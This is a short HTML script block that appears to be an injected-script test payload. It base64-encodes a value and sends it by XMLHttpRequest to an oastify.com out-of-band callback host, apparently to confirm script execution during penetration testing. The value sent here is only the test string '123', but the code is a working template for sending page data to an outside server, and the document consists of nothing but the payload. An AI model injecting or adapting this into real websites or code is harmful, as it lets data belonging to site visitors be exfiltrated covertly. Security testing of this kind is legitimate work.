<script>
	var url = "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?testing=" + btoa("123");
	function reqListener() {
		console.log("done");
	};
	const req = new XMLHttpRequest();
	req.addEventListener("load", reqListener);
	req.open("GET", url);
	req.send();
</script>
